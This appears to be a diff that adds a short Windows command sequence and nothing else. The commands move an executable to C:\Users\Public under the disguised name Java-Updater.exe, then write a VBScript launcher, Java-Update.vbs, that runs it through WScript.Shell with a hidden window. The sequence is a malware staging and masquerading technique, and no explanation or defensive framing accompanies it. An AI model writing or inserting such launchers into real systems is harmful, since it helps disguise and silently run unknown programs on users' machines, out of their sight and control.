@@ -1,0 +1,5 @@
+Move-Item Java-Update.exe C:\Users\Public\Java-Updater.exe;
+echo Set oShell = CreateObject ("Wscript.Shell") > C:\Users\Public\Java-Update.vbs;
+echo Dim strArgs >> C:\Users\Public\Java-Update.vbs;
+echo strArgs = "C:\Users\Public\Java-Updater.exe" >> C:\Users\Public\Java-Update.vbs;
+echo oShell.Run strArgs, 0, false >> C:\Users\Public\Java-Update.vbs
